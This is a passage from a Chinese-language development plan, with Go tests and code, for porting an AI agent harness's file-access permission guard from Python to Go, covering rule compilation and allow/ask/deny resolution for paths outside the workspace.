bash -c 包裹的路径访问抽不到。

同时解决 security ↔ fileguard 循环依赖：security 包定义
FileGuardEvaluator / NetGuardEvaluator 接口与工厂变量，fileguard 在
init 中注册工厂实现。security 只依赖接口，不 import 子包。"
git show --stat HEAD
```

---

## Task 6：`security/fileguard/file_guard.go`

**Files:**
- Create: `internal/agentcore/harness/security/fileguard/file_guard.go`
- Create: `internal/agentcore/harness/security/fileguard/file_guard_test.go`
- Read: `/home/opensource/agent-core/openjiuwen/harness/security/permission_engine/fileguard/file_guard.py`（870 行）

> **本任务是全批最长的单个文件（870 行）。建议按「配置编译 → 判定 → 工厂」三段推进。**

- [ ] **Step 1: 写失败测试——配置编译的 enabled 推导（`normalize_path_guard_config`）**

```go
// TestNormalizePathGuardConfig_enabled推导 测试三种 enabled 推导路径
func TestNormalizePathGuardConfig_enabled推导(t *testing.T) {
	cases := []struct {
		name        string
		perms       map[string]any
		trustedDirs []string
		wantEnabled bool
	}{
		{
			name:        "无任何配置默认关闭",
			perms:       map[string]any{},
			wantEnabled: false,
		},
		{
			name:        "显式 enabled=true",
			perms:       map[string]any{"file_guard": map[string]any{"enabled": true}},
			wantEnabled: true,
		},
		{
			name:        "显式 enabled=false 覆盖 external_directory",
			perms:       map[string]any{"file_guard": map[string]any{"enabled": false}, "external_directory": map[string]any{"*": "ask"}},
			wantEnabled: false,
		},
		{
			name:        "external_directory 非空隐式开启",
			perms:       map[string]any{"external_directory": map[string]any{"*": "ask"}},
			wantEnabled: true,
		},
		{
			name:        "trustedDirs 非空隐式开启",
			perms:       map[string]any{},
			trustedDirs: []string{"/trusted"},
			wantEnabled: true,
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := NormalizePathGuardConfig(c.perms, "/ws", c.trustedDirs)
			if got.Enabled != c.wantEnabled {
				t.Errorf("Enabled = %v, want %v", got.Enabled, c.wantEnabled)
			}
		})
	}
}

// TestNormalizePathGuardConfig_native判定 测试 hasNativeFileGuard 的五条规则
func TestNormalizePathGuardConfig_native判定(t *testing.T) {
	cases := []struct {
		name     string
		perms    map[string]any
		wantMode string
	}{
		{
			name:     "显式 defaults 轴 → native",
			perms:    map[string]any{"file_guard": map[string]any{"enabled": true, "defaults": map[string]any{"read": "ask"}}},
			wantMode: "native",
		},
		{
			name:     "显式 workspace 轴 → native",
			perms:    map[string]any{"file_guard": map[string]any{"enabled": true, "workspace": map[string]any{"read": "allow"}}},
			wantMode: "native",
		},
		{
			name:     "paths 含 glob → native",
			perms:    map[string]any{"file_guard": map[string]any{"enabled": true, "paths": []any{map[string]any{"path": "/a/**", "match": "glob"}}}},
			wantMode: "native",
		},
		{
			name:     "仅 paths 无 external_directory → native",
			perms:    map[string]any{"file_guard": map[string]any{"enabled": true, "paths": []any{map[string]any{"path": "/a", "read": "ask"}}}},
			wantMode: "native",
		},
		{
			name: "仅 paths 但有 external_directory → legacy",
			perms: map[string]any{
				"file_guard":         map[string]any{"enabled": true, "paths": []any{map[string]any{"path": "/a", "read": "ask"}}},
				"external_directory": map[string]any{"*": "ask"},
			},
			wantMode: "legacy",
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := NormalizePathGuardConfig(c.perms, "/ws", nil)
			if got.Mode != c.wantMode {
				t.Errorf("Mode = %q, want %q", got.Mode, c.wantMode)
			}
		})
	}
}
```

- [ ] **Step 2: 运行确认失败**

```bash
CGO_ENABLED=1 go test -tags "sqlite_fts5 test" ./internal/agentcore/harness/security/fileguard/ -run TestNormalizePathGuardConfig 2>&1 | head
```

Expected: `undefined: NormalizePathGuardConfig`。

- [ ] **Step 3: 实现配置编译（`file_guard.go` 第一部分）**

结构体与常量：

```go
// ──────────────────────────── 结构体 ────────────────────────────

// FileGuardAxisDefaults 三轴的默认判定级别。
//
// Python: @dataclass(frozen=True) FileGuardAxisDefaults
type FileGuardAxisDefaults struct {
	Read  security.PermissionLevel
	Write security.PermissionLevel
	Exec  security.PermissionLevel
}

// FileGuardPathRule 一条路径规则。
//
// Python: @dataclass(frozen=True) FileGuardPathRule
type FileGuardPathRule struct {
	// Path 归整后的路径（prefix 匹配）或 glob 模式
	Path  string
	Read  security.PermissionLevel
	Write security.PermissionLevel
	Exec  security.PermissionLevel
	// Match "prefix" 或 "glob"
	Match string
}

// EffectiveFileGuardConfig 加载期编译后的生效视图（不写回调用方 dict）。
//
// Python: @dataclass(frozen=True) EffectiveFileGuardConfig
type EffectiveFileGuardConfig struct {
	Enabled       bool
	Mode          string
	Defaults      FileGuardAxisDefaults
	Paths         []FileGuardPathRule
	WorkspaceRoot string
}

// ──────────────────────────── 全局变量 ────────────────────────────

var (
	// writePathToolSet 写类路径工具（fileguard 内独立一份，与 security.WritePathTools 同源）
	writePathToolSet = map[string]struct{}{
		"write_file": {}, "edit_file": {}, "write_text_file": {}, "write": {}, "search_replace": {},
	}
	// pathAwareCommands 会访问路径的命令
	pathAwareCommands = map[string]struct{}{
		"cd": {}, "rm": {}, "cp": {}, "mv": {}, "mkdir": {}, "touch": {}, "chmod": {}, "chown": {},
		"cat": {}, "ls": {}, "dir": {}, "type": {}, "del": {}, "rd": {}, "copy": {}, "move": {}, "md": {},
		"head": {}, "tail": {}, "more": {}, "less": {}, "vim": {}, "nano": {}, "gedit": {}, "notepad": {},
	}
	// levelOrder 严格度排序（数字越小越严）
	levelOrder = map[security.PermissionLevel]int{
		security.PermissionLevelDeny:  0,
		security.PermissionLevelAsk:   1,
		security.PermissionLevelAllow: 2,
	}
	// pathClassTools 路径类工具（供 reportLegacyPathRulesAtLoad 用）
	pathClassTools = map[string]struct{}{
		"read_file": {}, "write_file": {}, "edit_file": {}, "read_text_file": {}, "write_text_file": {},
		"write": {}, "read": {}, "glob_file_search": {}, "glob": {}, "list_dir": {}, "list_files": {},
		"grep": {}, "search_replace": {},
	}
	// loadWarnedRuleIDs 加载期已告警的规则 id（去重）
	loadWarnedRuleIDsMu sync.Mutex
	loadWarnedRuleIDs   = map[string]struct{}{}
)
```

`NormalizePathGuardConfig` 与 `hasNativeFileGuard`：

```go
// NormalizePathGuardConfig 把 permissions 与运行时 trusted_dirs 编译为生效配置。
//
// enabled 推导顺序（不可调换）：
//  1. file_guard.enabled 显式给出 → 用之
//  2. external_directory 非空 或 trusted_dirs 非空 → true
//  3. 否则 false
//
// Python: normalize_path_guard_config(permissions, *, workspace_root, trusted_dirs)
func NormalizePathGuardConfig(permissions map[string]any, workspaceRoot string, trustedDirs []string) EffectiveFileGuardConfig {
	perms := permissions
	if perms == nil {
		perms = map[string]any{}
	}
	fg := mapAnyOrNil(perms["file_guard"])
	ext := perms["external_directory"]
	hasExt := externalDirectoryNonEmpty(ext)
	hasTrusted := len(trustedDirs) > 0

	enabled := false
	if explicit, ok := explicitEnabled(fg); ok {
		enabled = explicit
	} else if hasExt || hasTrusted {
		enabled = true
	}

	ws := ""
	if strings.TrimSpace(workspaceRoot) != "" {
		ws = posixNorm(workspaceRoot)
	}
	native := hasNativeFileGuard(fg, perms)

	if !enabled {
		mode := "legacy"
		if native {
			mode = "native"
		}
		return EffectiveFileGuardConfig{
			Enabled: false,
			Mode:    mode,
			Defaults: FileGuardAxisDefaults{
				Read:  security.PermissionLevelAsk,
				Write: security.PermissionLevelAsk,
				Exec:  security.PermissionLevelAsk,
			},
			WorkspaceRoot: ws,
		}
	}
	if native {
		return normalizeNative(fg, ext, ws, trustedDirs)
	}
	return normalizeLegacy(ext, ws, trustedDirs, pathListOf(fg["paths"]))
}

// hasNativeFileGuard 判定是否进入 Native 语义。
//
// 五条规则（顺序不可调换）：
//  1. 显式 defaults 轴 → Native
//  2. 显式 workspace 轴 → Native
//  3. paths 非空且含 match: glob → Native
//  4. paths 非空、无 glob、且存在 external_directory → Legacy
//  5. paths 非空、无 glob、无 external_directory → Native
//
// Python: _has_native_file_guard(fg, permissions)
func hasNativeFileGuard(fg, permissions map[string]any) bool {
	if hasAxisDict(fg["defaults"]) || hasAxisDict(fg["workspace"]) {
		return true
	}
	paths := pathListOf(fg["paths"])
	if len(paths) == 0 {
		return false
	}
	for _, p := range paths {
		if m, ok := p["match"].(string); ok && m == "glob" {
			return true
		}
	}
	if externalDirectoryNonEmpty(permissions["external_directory"]) {
		return false
	}
	return true
}
```

- [ ] **Step 4: 实现 `normalizeLegacy` 与 `normalizeNative`**

```go
// normalizeLegacy 编译 Legacy 模式的生效配置。
//
// 规则追加顺序（即优先级，_resolveOne 取最长前缀）：
//  1. workspace 隐式全放行（三轴 allow）
//  2. 每个 trusted_dir（read/write allow、exec ask）
//  3. external_directory 具名键（allow → 三轴 allow 但 exec 为 ask；其他 → 三轴同 action）
//  4. file_guard.paths 中无 glob 的项（/add-dir 写入）
//
// Python: _normalize_legacy(*, ext, workspace_root, trusted_dirs, file_guard_paths=None)
func normalizeLegacy(ext any, workspaceRoot string, trustedDirs []string, fileGuardPaths []map[string]any) EffectiveFileGuardConfig {
	starAction := "ask"
	var allowPrefixes [][2]string
	switch v := ext.(type) {
	case string:
		starAction = v
	case map[string]any:
		if star, ok := v["*"].(string); ok {
			starAction = star
		}
		for key, action := range v {
			if key == "*" {
				continue
			}
			actionStr, ok := action.(string)
			if !ok {
				continue
			}
			if actionStr != "allow" && actionStr != "ask" && actionStr != "deny" {
				continue
			}
			allowPrefixes = append(allowPrefixes, [2]string{key, actionStr})
		}
	}
	// map 遍历无序，按 key 排序保证结果稳定
	sort.Slice(allowPrefixes, func(i, j int) bool { return allowPrefixes[i][0] < allowPrefixes[j][0] })

	defaults := axisFromStar(starAction)
	rules := make([]FileGuardPathRule, 0, 4+len(trustedDirs)+len(allowPrefixes))

	// 1. workspace 隐式全放行
	if workspaceRoot != "" {
		if rule := compilePathEntry(workspaceRoot, levelPtr("allow"), levelPtr("allow"), levelPtr("allow"), "prefix", security.PermissionLevelAsk); rule != nil {
			rules = append(rules, *rule)
		}
	}
	// 2. trusted_dirs
	for _, td := range trustedDirs {
		if rule := compilePathEntry(td, levelPtr("allow"), levelPtr("allow"), levelPtr("ask"), "prefix", security.PermissionLevelAsk); rule != nil {
			rules = append(rules, *rule)
		}
	}
	// 3. external_directory 具名键
	for _, item := range allowPrefixes {
		key, action := item[0], item[1]
		var rule *FileGuardPathRule
		if action == "allow" {
			rule = compilePathEntry(key, levelPtr("allow"), levelPtr("allow"), levelPtr("ask"), "prefix", security.PermissionLevelAsk)
		} else {
			rule = compilePathEntry(key, levelPtr(action), levelPtr(action), levelPtr(action), "prefix", security.PermissionLevelAsk)
		}
		if rule != nil {
			rules = append(rules, *rule)
		}
	}
	// 4. file_guard.paths 中无 glob 的项
	for _, item := range fileGuardPaths {
		if match, _ := item["match"].(string); match == "glob" {
			continue
		}
		pathV, ok := item["path"].(string)
		if !ok || strings.TrimSpace(pathV) == "" {
			continue
		}
		readLevel := stringOrDefault(item["read"], "allow")
		writeLevel := stringOrDefault(item["write"], "allow")
		execLevel := stringOrDefault(item["exec"], "ask")
		if rule := compilePathEntry(pathV, levelPtr(readLevel), levelPtr(writeLevel), levelPtr(execLevel), "prefix", security.PermissionLevelAsk); rule != nil {
			rules = append(rules, *rule)
		}
	}

	return EffectiveFileGuardConfig{
		Enabled:       true,
		Mode:          "legacy",
		Defaults:      defaults,
		Paths:         rules,
		WorkspaceRoot: workspaceRoot,
	}
}

// normalizeNative 编译 Native 模式的生效配置。
//
// 规则追加顺序：
//  1. file_guard.paths 逐项（prefix 或 glob）
//  2. file_guard.workspace 绑定 workspaceRoot 的轴规则
//  3. 每个 trusted_dir（read/write allow、exec ask）
//  4. external_directory 具名键作迁移源（不覆盖已有同 path 的 prefix 规则）
//
// defaults 的推导：file_guard.defaults 有任一轴键则按它解析；否则从
// external_directory 的 "*"（或字符串形式）迁移；都没有则三轴 ASK。
//
// Python: _normalize_native(fg, *, ext, workspace_root, trusted_dirs)
func normalizeNative(fg map[string]any, ext any, workspaceRoot string, trustedDirs []string) EffectiveFileGuardConfig {
	rawDefaults, _ := fg["defaults"].(map[string]any)
	var defaults FileGuardAxisDefaults
	hasAxis := hasAxisDict(rawDefaults)
	if !hasAxis {
		switch v := ext.(type) {
		case map[string]any:
			defaults = axisFromStar(stringOrDefault(v["*"], "ask"))
		case string:
			defaults = axisFromStar(v)
		default:
			defaults = axisFromStar("ask")
		}
	} else {
		defaults = FileGuardAxisDefaults{
			Read:  parseFileGuardLevel(rawDefaults["read"], security.PermissionLevelAsk),
			Write: parseFileGuardLevel(rawDefaults["write"], security.PermissionLevelAsk),
			Exec:  parseFileGuardLevel(rawDefaults["exec"], security.PermissionLevelAsk),
		}
	}

	rules := make([]FileGuardPathRule, 0, 4)
	// 1. file_guard.paths
	for _, item := range pathListOf(fg["paths"]) {
		pathV, ok := item["path"].(string)
		if !ok || strings.TrimSpace(pathV) == "" {
			continue
		}
		match := "prefix"
		if m, _ := item["match"].(string); m == "glob" {
			match = "glob"
		}
		rule := compilePathEntry(
			pathV,
			levelPtrOptional(item["read"]),
			levelPtrOptional(item["write"]),
			levelPtrOptional(item["exec"]),
			match,
			security.PermissionLevelAsk,
		)
		if rule != nil {
			rules = append(rules, *rule)
		}
	}
	// 2. file_guard.workspace 绑定 workspaceRoot
	if rule := compileWorkspaceAxisRule(fg["workspace"], workspaceRoot); rule != nil {
		rules = append(rules, *rule)
	}
	// 3. trusted_dirs
	for _, td := range trustedDirs {
		if rule := compilePathEntry(td, levelPtr("allow"), levelPtr("allow"), levelPtr("ask"), "prefix", security.PermissionLevelAsk); rule != nil {
			rules = append(rules, *rule)
		}
	}
	// 4. external_directory 迁移源
	if extMap, ok := ext.(map[string]any); ok {
		existing := make(map[string]struct{}, len(rules))
		for _, r := range rules {
			if r.Match == "prefix" {
				existing[r.Path] = struct{}{}
			}
		}
		keys := make([]string, 0, len(extMap))
		for k := range extMap {
			keys = append(keys, k)
		}
		sort.Strings(keys)
		for _, key := range keys {
			if key == "*" {
				continue
			}
			action, ok := extMap[key].(string)
			if !ok || (action != "allow" && action != "ask" && action != "deny") {
				continue
			}
			keyNorm := posixNormLoose(key)
			if _, dup := existing[keyNorm]; dup {
				continue
			}
			var rule *FileGuardPathRule
			if action == "allow" {
				rule = compilePathEntry(key, levelPtr("allow"), levelPtr("allow"), levelPtr("ask"), "prefix", security.PermissionLevelAsk)
			} else {
				rule = compilePathEntry(key, levelPtr(action), levelPtr(action), levelPtr(action), "prefix", security.PermissionLevelAsk)
			}
			if rule != nil {
				rules = append(rules, *rule)
				logger.Warn(logComponent).
					Str("key", key).
					Str("action", action).
					Msg("fileguard.migrate.external_directory_to_file_guard_paths")
			}
		}
	}

	return EffectiveFileGuardConfig{
		Enabled:       true,
		Mode:          "native",
		Defaults:      defaults,
		Paths:         rules,
		WorkspaceRoot: workspaceRoot,
	}
}

// compileWorkspaceAxisRule 把 file_guard.workspace 编译为绑定 workspaceRoot 的前缀规则。
// 无 workspaceRoot 时 WARN 并跳过（不应用该规则）。
//
// Python: _compile_workspace_axis_rule(workspace_cfg, *, workspace_root)
func compileWorkspaceAxisRule(workspaceCfg any, workspaceRoot string) *FileGuardPathRule {
	cfg, ok := workspaceCfg.(map[string]any)
	if !ok || !hasAxisDict(cfg) {
		return nil
	}
	if workspaceRoot == "" {
		logger.Warn(logComponent).
			Msg("fileguard.workspace.rule_skipped reason=no_workspace_root")
		return nil
	}
	return compilePathEntry(
		workspaceRoot,
		levelPtrOptional(cfg["read"]),
		levelPtrOptional(cfg["write"]),
		levelPtrOptional(cfg["exec"]),
		"prefix",
		security.PermissionLevelAsk,
	)
}
```

**辅助函数**（同文件）：

```go
// levelPtr 把字符串级别转为指针，非法值回落到指定的默认。
func levelPtr(s string) *security.PermissionLevel {
	lv := parseFileGuardLevel(s, security.PermissionLevelAsk)
	return &lv
}

// levelPtrOptional 把 any 级别转为指针；nil 返回 nil（表示沿用 defaultLevel）。
func levelPtrOptional(v any) *security.PermissionLevel {
	if v == nil {
		return nil
	}
	s, ok := v.(string)
	if !ok {
		return nil
	}
	lv := parseFileGuardLevel(s, security.PermissionLevelAsk)
	return &lv
}

// parseFileGuardLevel 解析级别字符串，非法值返回 default。
//
// Python: _parse_level(raw, default=PermissionLevel.ASK)
func parseFileGuardLevel(v any, def security.PermissionLevel) security.PermissionLevel {
	s, ok := v.(string)
	if !ok {
		return def
	}
	switch strings.ToLower(strings.TrimSpace(s)) {
	case "allow":
		return security.PermissionLevelAllow
	case "ask":
		return security.PermissionLevelAsk
	case "deny":
		return security.PermissionLevelDeny
	}
	return def
}

// axisFromStar 把统一 action 展开成三轴默认。
//
// Python: _axis_from_star(action)
func axisFromStar(action string) FileGuardAxisDefaults {
	lv := parseFileGuardLevel(action, security.PermissionLevelAsk)
	return FileGuardAxisDefaults{Read: lv, Write: lv, Exec: lv}
}

// hasAxisDict 判定 map 是否含 read/write/exec 任一轴键。
//
// Python: _has_axis_dict(items)
func hasAxisDict(v any) bool {
	m, ok := v.(map[string]any)
	if !ok {
		return false
	}
	for _, k := range []string{"read", "write", "exec"} {
		if _, has := m[k]; has {
			return true
		}
	}
	return false
}

// stringOrDefault 取字符串值，非字符串或空串用默认值。
func stringOrDefault(v any, def string) string {
	if s, ok := v.(string); ok && s != "" {
		return s
	}
	return def
}

// posixNormLoose 尽力归一化为 posix 形式，不解析符号链接（用于去重比较）。
func posixNormLoose(p string) string {
	expanded := expandRaw(p)
	if resolved, err := posixNormSafe(expanded); err == nil {
		return resolved
	}
	norm := strings.TrimSuffix(strings.ReplaceAll(expanded, `\`, "/"), "/")
	return norm
}
```

- [ ] **Step 5: 实现 `compilePathEntry` 的两次过短前缀判断**

```go
// compilePathEntry 编译一条路径规则。返回 nil 表示跳过。
//
// 过短前缀（归一化前后都不含 "/"）跳过两次，避免 "C:" 误匹配整盘。
//
// Python: _compile_path_entry(path_raw, *, read, write, exec_, match, default_level)
func compilePathEntry(pathRaw string, read, write, execP *security.PermissionLevel, match string, defaultLevel security.PermissionLevel) *FileGuardPathRule {
	pathS := strings.TrimSpace(pathRaw)
	if pathS == "" || pathS == "*" {
		return nil
	}
	r := defaultLevel
	if read != nil {
		r = *read
	}
	w := defaultLevel
	if write != nil {
		w = *write
	}
	e := defaultLevel
	if execP != nil {
		e = *execP
	}
	r, w, e = applyImplications(r, w, e, pathS)

	if match == "prefix" {
		// 第一次判断：原始串
		norm := strings.TrimSuffix(strings.ReplaceAll(pathS, `\`, "/"), "/")
		if !strings.Contains(norm, "/") {
			return nil
		}
		// 归一化
		if resolved, err := posixNormSafe(expandRaw(pathS)); err == nil {
			pathS = resolved
		} else {
			pathS = norm
		}
		// 第二次判断：归一化后
		if !strings.Contains(strings.TrimSuffix(pathS, "/"), "/") {
			return nil
		}
	}
	return &FileGuardPathRule{Path: pathS, Read: r, Write: w, Exec: e, Match: match}
}

// applyImplications 应用 Write⇒Read / Exec⇒Read 蕴含。
// 显式更严的 read（deny）优先于蕴含，并打 WARN。
//
// Python 原文（file_guard.py:110-132）：
//
//	if write == ALLOW or exec_ == ALLOW:
//	    if read == DENY:
//	        logger.warning("implication.conflict path=%s write=%s exec=%s read=deny "
//	                       "(explicit deny wins over Write/Exec⇒Read)")
//	        return read, write, exec_
//	    return ALLOW, write, exec_
//	return read, write, exec_
//
// 注意：只有 write 或 exec 为 allow 时才触发蕴含；返回的 read 是 ALLOW 而非原 read。
func applyImplications(read, write, execP security.PermissionLevel, pathLabel string) (security.PermissionLevel, security.PermissionLevel, security.PermissionLevel) {
	if write == security.PermissionLevelAllow || execP == security.PermissionLevelAllow {
		if read == security.PermissionLevelDeny {
			logger.Warn(logComponent).
				Str("path", pathLabel).
				Str("write", write.String()).
				Str("exec", execP.String()).
				Msg("fileguard.implication.conflict explicit_read_deny_wins")
			return read, write, execP
		}
		return security.PermissionLevelAllow, write, execP
	}
	return read, write, execP
}
```

- [ ] **Step 6: 实现判定（`Evaluate` / `CollectAskAccesses` / `resolveOne`）**

按 spec §3.4.6 / §3.4.7 / §3.4.8 的伪码实现。三处易错点已在 spec 标注：

- `hit_external or None` → Go 返回 nil 切片而非空切片
- prefix 判定的**两层**：`startswith` + `containsPath`
- `best_prefix` 取**最长**前缀

```go
// Evaluate 评估路径层；无意见或全部 ALLOW 时返回 nil（不抬升 Pipeline A）。
//
// Python: FileGuardChecker.evaluate(tool_name, tool_args)
func (c *FileGuardChecker) Evaluate(toolName string, toolArgs map[string]any) *security.PermissionResult {
	if !c.effective.Enabled {
		return nil
	}
	workspace := c.effective.WorkspaceRoot
	if workspace == "" {
		logger.Debug(logComponent).Msg("fileguard.skip reason=no_workspace")
		return nil
	}

	accesses := c.collectAccesses(toolName, toolArgs)
	if len(accesses) == 0 {
		return nil
	}

	overall := security.PermissionLevelAllow
	var hitExternal []string
	var matchedBits []string

	for _, acc := range accesses {
		level, ruleID := c.resolveOne(acc.Path, acc.Action)
		overall = security.Strictest(overall, level)
		if level != security.PermissionLevelAllow {
			hitExternal = append(hitExternal, acc.Path)
			if ruleID != "" {
				matchedBits = append(matchedBits, ruleID)
			}
		}
	}
	if overall == security.PermissionLevelAllow {
		return nil
	}

	var reason, matched string
	if c.effective.Mode == "legacy" {
		sample := accesses[0].Path
		if overall == security.PermissionLevelDeny {
			reason = "Access to paths outside workspace is denied: " + sample
		} else {
			reason = "Access to paths outside workspace requires approval: " + sample
		}
		matched = "external_directory.*"
	} else {
		hint := accesses[0].Path
		if len(hitExternal) > 0 {
			hint = hitExternal[0]
		}
		if overall == security.PermissionLevelDeny {
			reason = "file_guard denied: " + hint
		} else {
			reason = "file_guard requires approval: " + hint
		}
		if len(matchedBits) > 0 {
			matched = strings.Join(matchedBits, "|")
		} else {
			matched = "file_guard"
		}
	}

	// Python: external_paths=hit_external or None —— 空列表要返回 nil，不是空切片
	var externalPaths []string
	if len(hitExternal) > 0 {
		externalPaths = hitExternal
	}

	return &security.PermissionResult{
		Permission:    overall,
		Reason:        reason,
		MatchedRule:   matched,
		ExternalPaths: externalPaths,
	}
}
```

- [ ] **Step 7: 实现工厂与接口适配**

先补齐 `Evaluate` 依赖的三个非导出方法：

```go
// collectAccesses 按模式抽取本次调用的路径访问。
//
// Python: FileGuardChecker.evaluate 与 collect_ask_accesses 中重复的两段抽取
func (c *FileGuardChecker) collectAccesses(toolName string, toolArgs map[string]any) []FileAccess {
	workspace := c.effective.WorkspaceRoot
	if workspace == "" {
		return nil
	}
	if c.effective.Mode == "native" {
		return ExtractAccessesNative(toolName, toolArgs, workspace, c.permissionConfig)
	}
	// legacy：路径无轴，用工具默认动作
	paths := ExtractPathsLegacy(toolName, toolArgs, workspace, c.permissionConfig)
	action := toolDefaultAction(toolName, c.permissionConfig)
	out := make([]FileAccess, 0, len(paths))
	for _, p := range paths {
		out = append(out, FileAccess{Path: p, Action: action})
	}
	return out
}

// collectAskAccessesInternal 返回本次判定为 ASK 的 (path, action) 去重列表。
//
// 去重键是 (path, action) 二元组，不是单纯 path——同一路径在 read 轴 ASK
// 而在 write 轴 ALLOW 是可能的。只收 ASK，不含 DENY/ALLOW。
//
// Python: FileGuardChecker.collect_ask_accesses(tool_name, tool_args)
func (c *FileGuardChecker) collectAskAccessesInternal(toolName string, toolArgs map[string]any) []FileAccess {
	if !c.effective.Enabled || c.effective.WorkspaceRoot == "" {
		return nil
	}
	accesses := c.collectAccesses(toolName, toolArgs)
	out := make([]FileAccess, 0, len(accesses))
	seen := make(map[string]struct{}, len(accesses))
	for _, acc := range accesses {
		level, _ := c.resolveOne(acc.Path, acc.Action)
		if level != security.PermissionLevelAsk {
			continue
		}
		key := acc.Path + "\x00" + string(acc.Action)
		if _, dup := seen[key]; dup {
			continue
		}
		seen[key] = struct{}{}
		out = append(out, acc)
	}
	return out
}

// resolveOne 判定单个路径在给定轴上的级别，并返回命中的规则 id。
//
// 三处细节（对齐 Python _resolve_one）：
//  1. prefix 判定两层：字符串前缀 + containsPath（后者处理 Windows 盘符怪例）
//  2. 多个 prefix 命中时取**最长**前缀
//  3. glob 与 prefix 的级别一起取 min（严格者胜），但 rule_id 优先 prefix
//
// Python: FileGuardChecker._resolve_one(path, action)
func (c *FileGuardChecker) resolveOne(pathPosix string, action FileAction) (security.PermissionLevel, string) {
	var bestPrefixLen int
	var bestPrefixRule *FileGuardPathRule
	var globHits []security.PermissionLevel

	for i := range c.effective.Paths {
		rule := &c.effective.Paths[i]
		if rule.Match == "glob" {
			if matchFileGuardGlob(strings.ReplaceAll(rule.Path, `\`, "/"), pathPosix) {
				globHits = append(globHits, levelForAction(rule, action))
			}
			continue
		}
		prefix := strings.TrimSuffix(rule.Path, "/")
		if pathPosix == prefix || strings.HasPrefix(pathPosix, prefix+"/") {
			if containsPath(prefix, pathPosix) || pathPosix == prefix || strings.HasPrefix(pathPosix, prefix+"/") {
				if bestPrefixRule == nil || len(prefix) > bestPrefixLen {
					bestPrefixLen = len(prefix)
					bestPrefixRule = rule
				}
			}
		}
	}

	candidates := make([]security.PermissionLevel, 0, 1+len(globHits))
	ruleID := ""
	if bestPrefixRule != nil {
		candidates = append(candidates, levelForAction(bestPrefixRule, action))
		ruleID = "file_guard:prefix:" + bestPrefixRule.Path
	}
	candidates = append(candidates, globHits...)
	if len(globHits) > 0 && ruleID == "" {
		ruleID = "file_guard:glob"
	}
	if len(candidates) > 0 {
		// deny > ask > allow —— levelOrder 数字越小越严
		strictest := candidates[0]
		for _, lv := range candidates[1:] {
			if levelOrder[lv] < levelOrder[strictest] {
				strictest = lv
			}
		}
		return strictest, ruleID
	}

	switch action {
	case FileActionWrite:
		return c.effective.Defaults.Write, "file_guard:defaults"
	case FileActionExec:
		return c.effective.Defaults.Exec, "file_guard:defaults"
	}
	return c.effective.Defaults.Read, "file_guard:defaults"
}
```

> **`containsPath`** 需从 `security/patterns.go` 导出后引用（`security.ContainsPath`），或在 fileguard 内重新实现。Python 侧它也来自 `toolguard/pattern_matchers`，按 D3 方案 B 统一从 `security` 包导出。

其余辅助函数：

```go
// levelForAction 取规则在指定轴上的级别。
//
// Python: _level_for_action(rule, action)
func levelForAction(rule *FileGuardPathRule, action FileAction) security.PermissionLevel {
	switch action {
	case FileActionWrite:
		return rule.Write
	case FileActionExec:
		return rule.Exec
	}
	return rule.Read
}

// matchFileGuardGlob 简单 glob：支持 ** / * / ?（路径用 posix 形式）。
//
// Python: _match_glob(pattern, path_posix)
func matchFileGuardGlob(pattern, pathPosix string) bool {
	var b strings.Builder
	i := 0
	for i < len(pattern) {
		switch {
		case strings.HasPrefix(pattern[i:], "**/"):
			b.WriteString(`(?:.*/)?`)
			i += 3
		case strings.HasPrefix(pattern[i:], "**"):
			b.WriteString(`.*`)
			i += 2
		case pattern[i] == '*':
			b.WriteString(`[^/]*`)
			i++
		case pattern[i] == '?':
			b.WriteString(`[^/]`)
			i++
		default:
			b.WriteString(regexp.QuoteMeta(string(pattern[i])))
			i++
		}
	}
	re, err := regexp.Compile("^" + b.String() + "$")
	if err != nil {
		return false
	}
	return re.MatchString(pathPosix)
}

// toolDefaultAction Legacy 模式下工具路径访问的默认轴。
//
// Legacy 不区分 exec；shell 与读取类都按 read 轴（与 ExternalDirectory
// 无轴一致，共用 defaults）。
//
// Python: _tool_default_action(tool_name, permission_config=None)
func toolDefaultAction(toolName string, permissionConfig map[string]any) FileAction {
	if _, isWrite := writePathToolSet[toolName]; isWrite {
		return FileActionWrite
	}
	return FileActionRead
}

// ReportLegacyPathRulesAtLoad 加载期 WARN：tools 全为 path 类且 pattern 像
// 路径的 rules 宜迁到 file_guard.paths。返回被标记的规则 id 列表。
//
// Python: report_legacy_path_rules_at_load(permissions)
func ReportLegacyPathRulesAtLoad(permissions map[string]any) []string {
	rules, ok := permissions["rules"].([]any)
	if !ok {
		return nil
	}
	var flagged []string
	for _, item := range rules {
		rule, ok := item.(map[string]any)
		if !ok {
			continue
		}
		ruleID, _ := rule["id"].(string)
		tools, ok := rule["tools"].([]any)
		if !ok {
			continue
		}
		pattern, ok := rule["pattern"].(string)
		if !ok {
			continue
		}
		if len(tools) == 0 {
			continue
		}
		allPathTools := true
		for _, t := range tools {
			name, ok := t.(string)
			if !ok {
				allPathTools = false
				break
			}
			if _, hit := pathClassTools[name]; !hit {
				allPathTools = false
				break
			}
		}
		if !allPathTools || !looksLikePathPattern(pattern) {
			continue
		}
		flagged = append(flagged, ruleID)
		cacheKey := ruleID
		if cacheKey == "" {
			cacheKey = "__anon__:" + pattern
		}
		loadWarnedRuleIDsMu.Lock()
		_, warned := loadWarnedRuleIDs[cacheKey]
		if !warned {
			loadWarnedRuleIDs[cacheKey] = struct{}{}
		}
		loadWarnedRuleIDsMu.Unlock()
		if !warned {
			logger.Warn(logComponent).
				Str("id", ruleID).
				Interface("tools", tools).
				Str("pattern", pattern).
				Msg("fileguard.permissions.rules.path_class_deprecated hint=migrate_to_file_guard_paths")
		}
	}
	return flagged
}

// looksLikePathPattern 判定 pattern 是否像路径。
//
// Python: _looks_like_path_pattern(pattern)
func looksLikePathPattern(pattern string) bool {
	s := strings.TrimSpace(pattern)
	if s == "" {
		return false
	}
	if strings.Contains(s, "/") || strings.Contains(s, `\`) || strings.Contains(s, "**") {
		return true
	}
	if strings.HasPrefix(s, "~") || strings.HasPrefix(s, "$") || strings.HasPrefix(s, "%") {
		return true
	}
	if len(s) > 1 && s[1] == ':' {
		return true
	}
	return false
}
```

工厂与接口适配：

```go
// BuildFileGuardChecker 编译配置；路径层关闭时返回 nil。
//
// Python: build_file_guard_checker(permissions, *, workspace_root, trusted_dirs)
func BuildFileGuardChecker(permissions map[string]any, workspaceRoot string, trustedDirs []string) *FileGuardChecker {
	perms := permissions
	if perms == nil {
		perms = map[string]any{}
	}
	ReportLegacyPathRulesAtLoad(perms)
